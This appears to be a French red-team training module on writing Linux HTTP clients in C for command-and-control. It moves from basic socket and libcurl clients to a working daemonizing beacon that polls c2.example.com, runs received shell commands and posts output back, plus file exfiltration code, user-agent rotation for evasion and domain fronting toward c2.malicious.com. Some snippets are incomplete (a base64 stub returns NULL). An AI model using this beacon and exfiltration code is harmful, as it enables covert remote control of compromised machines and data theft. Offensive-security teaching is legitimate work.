# Module L23 : Client HTTP Linux - Communication C2

## Objectifs

A la fin de ce module, tu vas maîtriser :
- La création de clients HTTP en C sous Linux
- L'utilisation de libcurl pour les communications
- L'implémentation de sockets raw HTTP
- Les techniques de communication avec un serveur C2
- L'exfiltration de données via HTTP/HTTPS

## 1. Fondamentaux HTTP

### 1.1 Le protocole HTTP

**HTTP (HyperText Transfer Protocol)** = protocole de communication client-serveur

```ascii
CLIENT HTTP                    SERVEUR HTTP
════════════                   ════════════

┌────────────┐                ┌────────────┐
│   Agent    │───── HTTP ────→│   C2       │
│  (Linux)   │    Request     │  Server    │
│            │←──── HTTP ─────│            │
│            │    Response    │            │
└────────────┘                └────────────┘

Format requête HTTP:
┌────────────────────────────────────┐
│ GET /api/beacon HTTP/1.1           │  ← Ligne de requête
│ Host: c2.example.com               │  ← Headers
│ User-Agent: Mozilla/5.0            │
│ Accept: */*                        │
│                                    │  ← Ligne vide
│ [Body optionnel]                   │  ← Corps (POST/PUT)
└────────────────────────────────────┘

Format réponse HTTP:
┌────────────────────────────────────┐
│ HTTP/1.1 200 OK                    │  ← Status line
│ Content-Type: application/json     │  ← Headers
│ Content-Length: 42                 │
│                                    │  ← Ligne vide
│ {"command":"shell","args":"ls"}    │  ← Corps
└────────────────────────────────────┘
```

### 1.2 Méthodes HTTP pour Red Team

```ascii
┌──────────────────────────────────────────────────┐
│  MÉTHODES HTTP - Utilisation C2                  │
├──────────────────────────────────────────────────┤
│                                                  │
│  GET  - Récupérer commandes du C2                │
│         Exemple: GET /api/tasks?id=beacon123     │
│         Usage: Polling périodique                │
│                                                  │
│  POST - Envoyer résultats au C2                  │
│         Exemple: POST /api/results               │
│         Body: Résultats commande, data volée     │
│         Usage: Exfiltration                      │
│                                                  │
│  PUT  - Upload de fichiers                       │
│         Exemple: PUT /api/upload/file.zip        │
│         Usage: Exfiltrer gros fichiers           │
│                                                  │
│  HEAD - Vérifier si C2 est up (stealthy)         │
│         Pas de body dans réponse                 │
│         Usage: Health check discret              │
│                                                  │
└──────────────────────────────────────────────────┘
```

## 2. Sockets Raw HTTP

### 2.1 Client HTTP basique en C

```c
// http_raw_client.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define BUFFER_SIZE 4096

typedef struct {
    char *host;
    int port;
    char *path;
} HttpRequest;

// Résoudre hostname en IP
int resolve_hostname(const char *hostname, char *ip) {
    struct hostent *he;
    struct in_addr **addr_list;

    if ((he = gethostbyname(hostname)) == NULL) {
        return -1;
    }

    addr_list = (struct in_addr **)he->h_addr_list;
    strcpy(ip, inet_ntoa(*addr_list[0]));
    return 0;
}

// Créer connexion TCP
int connect_to_server(const char *host, int port) {
    int sock;
    struct sockaddr_in server;
    char ip[100];

    // Résoudre hostname
    if (resolve_hostname(host, ip) != 0) {
        fprintf(stderr, "Failed to resolve hostname\n");
        return -1;
    }

    // Créer socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("socket");
        return -1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    // Connexion
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    return sock;
}

// Envoyer requête HTTP GET
int http_get(const char *host, int port, const char *path, char *response) {
    int sock;
    char request[1024];
    char buffer[BUFFER_SIZE];
    int bytes_received;
    int total = 0;

    // Connexion
    sock = connect_to_server(host, port);
    if (sock < 0) return -1;

    // Construire requête HTTP
    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host);

    // Envoyer requête
    if (send(sock, request, strlen(request), 0) < 0) {
        perror("send");
        close(sock);
        return -1;
    }

    // Recevoir réponse
    response[0] = '\0';
    while ((bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[bytes_received] = '\0';
        strcat(response, buffer);
        total += bytes_received;
    }

    close(sock);
    return total;
}

// Envoyer requête HTTP POST
int http_post(const char *host, int port, const char *path,
              const char *data, char *response) {
    int sock;
    char request[4096];
    char buffer[BUFFER_SIZE];
    int bytes_received;

    sock = connect_to_server(host, port);
    if (sock < 0) return -1;

    // Construire requête POST
    snprintf(request, sizeof(request),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %lu\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        path, host, strlen(data), data);

    // Envoyer
    if (send(sock, request, strlen(request), 0) < 0) {
        perror("send");
        close(sock);
        return -1;
    }

    // Recevoir réponse
    response[0] = '\0';
    while ((bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[bytes_received] = '\0';
        strcat(response, buffer);
    }

    close(sock);
    return strlen(response);
}

int main() {
    char response[8192];

    // Test GET
    printf("[*] Testing HTTP GET...\n");
    if (http_get("example.com", 80, "/", response) > 0) {
        printf("Response:\n%s\n", response);
    }

    // Test POST
    printf("\n[*] Testing HTTP POST...\n");
    const char *json_data = "{\"beacon_id\":\"12345\",\"status\":\"active\"}";
    if (http_post("httpbin.org", 80, "/post", json_data, response) > 0) {
        printf("Response:\n%s\n", response);
    }

    return 0;
}
```

### 2.2 Parser de réponse HTTP

```c
// http_parser.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    int status_code;
    char *headers;
    char *body;
} HttpResponse;

// Parser réponse HTTP
HttpResponse *parse_http_response(const char *response) {
    HttpResponse *resp = malloc(sizeof(HttpResponse));
    if (!resp) return NULL;

    // Trouver fin des headers (double CRLF)
    char *body_start = strstr(response, "\r\n\r\n");
    if (!body_start) {
        free(resp);
        return NULL;
    }

    // Parser status code
    sscanf(response, "HTTP/%*d.%*d %d", &resp->status_code);

    // Extraire headers
    size_t headers_len = body_start - response;
    resp->headers = malloc(headers_len + 1);
    strncpy(resp->headers, response, headers_len);
    resp->headers[headers_len] = '\0';

    // Extraire body
    body_start += 4; // Skip \r\n\r\n
    resp->body = strdup(body_start);

    return resp;
}

// Extraire un header spécifique
char *get_header(const char *headers, const char *header_name) {
    char search[256];
    snprintf(search, sizeof(search), "%s: ", header_name);

    char *start = strstr(headers, search);
    if (!start) return NULL;

    start += strlen(search);
    char *end = strstr(start, "\r\n");
    if (!end) return NULL;

    size_t len = end - start;
    char *value = malloc(len + 1);
    strncpy(value, start, len);
    value[len] = '\0';

    return value;
}

void free_http_response(HttpResponse *resp) {
    if (resp) {
        free(resp->headers);
        free(resp->body);
        free(resp);
    }
}
```

## 3. libcurl - Bibliothèque HTTP professionnelle

### 3.1 Introduction à libcurl

**libcurl** = bibliothèque C multiplateforme pour transferts réseau (HTTP, HTTPS, FTP, etc.)

Avantages:
- Supporte HTTPS/SSL automatiquement
- Gère redirections, cookies, authentification
- API simple et puissante
- Largement utilisé en production

```ascii
┌────────────────────────────────────────────────┐
│  LIBCURL - Architecture                        │
├────────────────────────────────────────────────┤
│                                                │
│  Application C                                 │
│       ↓                                        │
│  libcurl API (easy interface)                  │
│       ↓                                        │
│  ┌─────────────────────────────────┐          │
│  │  Protocol Handlers              │          │
│  │  ├─ HTTP/HTTPS                  │          │
│  │  ├─ FTP/FTPS                    │          │
│  │  ├─ SMTP                         │          │
│  │  └─ ...                          │          │
│  └─────────────────────────────────┘          │
│       ↓                                        │
│  SSL/TLS (OpenSSL/mbedTLS)                     │
│       ↓                                        │
│  Sockets TCP/IP                                │
│                                                │
└────────────────────────────────────────────────┘
```

### 3.2 Client HTTP GET avec libcurl

```c
// curl_get.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// Callback pour recevoir les données
typedef struct {
    char *data;
    size_t size;
} MemoryStruct;

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    MemoryStruct *mem = (MemoryStruct *)userp;

    char *ptr = realloc(mem->data, mem->size + realsize + 1);
    if (!ptr) {
        fprintf(stderr, "Not enough memory\n");
        return 0;
    }

    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = '\0';

    return realsize;
}

// Fonction HTTP GET
int curl_http_get(const char *url, char **response) {
    CURL *curl;
    CURLcode res;
    MemoryStruct chunk = {0};
    chunk.data = malloc(1);
    chunk.size = 0;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (!curl) return -1;

    // Configuration
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");

    // Suivre redirections
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    // Timeout
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

    // Exécuter requête
    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));
        free(chunk.data);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        return -1;
    }

    *response = chunk.data;

    curl_easy_cleanup(curl);
    curl_global_cleanup();

    return chunk.size;
}

int main() {
    char *response;

    if (curl_http_get("https://api.github.com", &response) > 0) {
        printf("Response:\n%s\n", response);
        free(response);
    }

    return 0;
}
```

**Compilation** :
```bash
gcc -o curl_get curl_get.c -lcurl
```

### 3.3 Client HTTP POST avec libcurl

```c
// curl_post.c
#include <stdio.h>
#include <curl/curl.h>

int curl_http_post(const char *url, const char *json_data, char **response) {
    CURL *curl;
    CURLcode res;
    MemoryStruct chunk = {0};
    chunk.data = malloc(1);
    chunk.size = 0;

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl = curl_easy_init();
    if (!curl) return -1;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));
        free(chunk.data);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return -1;
    }

    *response = chunk.data;

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return chunk.size;
}
```

### 3.4 HTTPS avec vérification SSL

```c
// curl_https.c
int curl_https_get(const char *url, char **response, int verify_ssl) {
    CURL *curl;
    CURLcode res;
    MemoryStruct chunk = {0};
    chunk.data = malloc(1);
    chunk.size = 0;

    curl = curl_easy_init();
    if (!curl) return -1;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    // Configuration SSL
    if (!verify_ssl) {
        // ATTENTION: Dangereux, mais parfois nécessaire en Red Team
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    } else {
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
        // curl_easy_setopt(curl, CURLOPT_CAINFO, "/path/to/ca-bundle.crt");
    }

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        fprintf(stderr, "Failed: %s\n", curl_easy_strerror(res));
        free(chunk.data);
        curl_easy_cleanup(curl);
        return -1;
    }

    *response = chunk.data;
    curl_easy_cleanup(curl);
    return chunk.size;
}
```

## 4. Communication C2

### 4.1 Architecture Beacon HTTP

```ascii
┌──────────────────────────────────────────────────┐
│  ARCHITECTURE BEACON HTTP                        │
├──────────────────────────────────────────────────┤
│                                                  │
│  BEACON (Agent)              C2 SERVER           │
│  ═══════════════             ══════════          │
│                                                  │
│  1. Check-in                                     │
│  ┌──────────┐                                    │
│  │ Beacon   │── GET /api/tasks?id=xxx ──→       │
│  │  Loop    │                            ┌────┐ │
│  │          │←─ 200 OK {"cmd":"whoami"} ─│ C2 │ │
│  └──────────┘                            └────┘ │
│       ↓                                          │
│  2. Execute                                      │
│  ┌──────────┐                                    │
│  │ Execute  │                                    │
│  │  whoami  │                                    │
│  │ Output:  │                                    │
│  │  "root"  │                                    │
│  └──────────┘                                    │
│       ↓                                          │
│  3. Exfiltrate                                   │
│  ┌──────────┐                                    │
│  │  POST    │── POST /api/results ───────→      │
│  │ Results  │   Body: {"output":"root"}  ┌────┐ │
│  │          │←─ 200 OK ──────────────────│ C2 │ │
│  └──────────┘                            └────┘ │
│       ↓                                          │
│  4. Sleep & Repeat                               │
│  ┌──────────┐                                    │
│  │ sleep(60)│                                    │
│  └──────────┘                                    │
│       ↓                                          │
│  (retour à 1)                                    │
│                                                  │
└──────────────────────────────────────────────────┘
```

### 4.2 Beacon HTTP simple

```c
// simple_beacon.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>

#define C2_URL "https://c2.example.com"
#define BEACON_ID "beacon-12345"
#define SLEEP_TIME 60

// Exécuter commande système et capturer output
char *execute_command(const char *cmd) {
    FILE *fp;
    char buffer[1024];
    char *result = malloc(4096);
    result[0] = '\0';

    fp = popen(cmd, "r");
    if (fp == NULL) {
        strcpy(result, "Error executing command");
        return result;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strcat(result, buffer);
    }

    pclose(fp);
    return result;
}

// Check-in au C2 pour récupérer commandes
char *checkin_c2() {
    char url[512];
    char *response;

    snprintf(url, sizeof(url), "%s/api/tasks?id=%s", C2_URL, BEACON_ID);

    if (curl_http_get(url, &response) > 0) {
        return response;
    }

    return NULL;
}

// Envoyer résultats au C2
int send_results(const char *output) {
    char url[512];
    char json[8192];
    char *response;

    snprintf(url, sizeof(url), "%s/api/results", C2_URL);
    snprintf(json, sizeof(json),
        "{\"beacon_id\":\"%s\",\"output\":\"%s\"}",
        BEACON_ID, output);

    return curl_http_post(url, json, &response);
}

// Parser commande du JSON C2
char *parse_command(const char *json) {
    // Simple parser (utiliser libjson en prod)
    char *cmd_start = strstr(json, "\"command\":\"");
    if (!cmd_start) return NULL;

    cmd_start += 11; // Skip "command":"
    char *cmd_end = strchr(cmd_start, '"');
    if (!cmd_end) return NULL;

    size_t len = cmd_end - cmd_start;
    char *cmd = malloc(len + 1);
    strncpy(cmd, cmd_start, len);
    cmd[len] = '\0';

    return cmd;
}

// Boucle principale beacon
void beacon_loop() {
    while (1) {
        printf("[*] Checking in with C2...\n");

        // 1. Check-in
        char *task = checkin_c2();
        if (task) {
            printf("[+] Received task: %s\n", task);

            // 2. Parser commande
            char *cmd = parse_command(task);
            if (cmd) {
                printf("[*] Executing: %s\n", cmd);

                // 3. Exécuter
                char *output = execute_command(cmd);

                // 4. Exfiltrer résultat
                printf("[*] Sending results...\n");
                send_results(output);

                free(cmd);
                free(output);
            }

            free(task);
        }

        // 5. Sleep
        printf("[*] Sleeping %d seconds...\n", SLEEP_TIME);
        sleep(SLEEP_TIME);
    }
}

int main() {
    // Daemonize (optionnel)
    if (fork() != 0) exit(0);
    setsid();

    // Lancer beacon
    beacon_loop();

    return 0;
}
```

## 5. Applications Offensives

### 5.1 Exfiltration de fichiers

```c
// file_exfil.c
#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <sys/stat.h>

// Encoder fichier en base64 (simplifié)
char *base64_encode(const unsigned char *data, size_t len) {
    // Implémentation base64 ici
    // Ou utiliser une lib comme libcurl
    return NULL; // Placeholder
}

// Exfiltrer fichier via POST
int exfiltrate_file(const char *filepath, const char *c2_url) {
    FILE *f = fopen(filepath, "rb");
    if (!f) return -1;

    // Lire fichier
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char *content = malloc(fsize);
    fread(content, 1, fsize, f);
    fclose(f);

    // Encoder base64
    char *encoded = base64_encode(content, fsize);
    free(content);

    // Créer JSON
    char *json = malloc(fsize * 2);
    snprintf(json, fsize * 2,
        "{\"filename\":\"%s\",\"data\":\"%s\"}",
        filepath, encoded);

    // Envoyer
    char *response;
    int ret = curl_http_post(c2_url, json, &response);

    free(encoded);
    free(json);
    free(response);

    return ret;
}
```

### 5.2 User-Agent randomization

```c
// user_agents.c
const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "curl/7.68.0",
    NULL
};

const char *get_random_user_agent() {
    srand(time(NULL));
    int count = 0;
    while (user_agents[count] != NULL) count++;
    return user_agents[rand() % count];
}

// Utilisation
curl_easy_setopt(curl, CURLOPT_USERAGENT, get_random_user_agent());
```

### 5.3 Domain fronting (contournement)

```c
// domain_fronting.c
int domain_fronting_request(const char *front_domain,
                            const char *real_host,
                            const char *path) {
    CURL *curl = curl_easy_init();

    // URL utilise le domaine de fronting
    char url[512];
    snprintf(url, sizeof(url), "https://%s%s", front_domain, path);
    curl_easy_setopt(curl, CURLOPT_URL, url);

    // Mais le header Host pointe vers le vrai C2
    struct curl_slist *headers = NULL;
    char host_header[256];
    snprintf(host_header, sizeof(host_header), "Host: %s", real_host);
    headers = curl_slist_append(headers, host_header);

    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // Exemple: URL = cdn.cloudflare.com, Host = c2.malicious.com
    // Le CDN route vers le bon backend basé sur Host header

    CURLcode res = curl_easy_perform(curl);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK) ? 0 : -1;
}
```

## Checklist

- [ ] Je comprends le protocole HTTP (requête/réponse)
- [ ] Je sais créer un client HTTP avec sockets raw
- [ ] Je maîtrise libcurl pour HTTP/HTTPS
- [ ] Je peux parser les réponses HTTP
- [ ] Je sais implémenter un beacon HTTP basique
- [ ] Je comprends le cycle check-in / execute / exfil
- [ ] Je peux exfiltrer des données via HTTP POST
- [ ] Je connais les techniques d'évasion (User-Agent, etc.)

## Exercices

Voir [exercice.md](exercice.md)
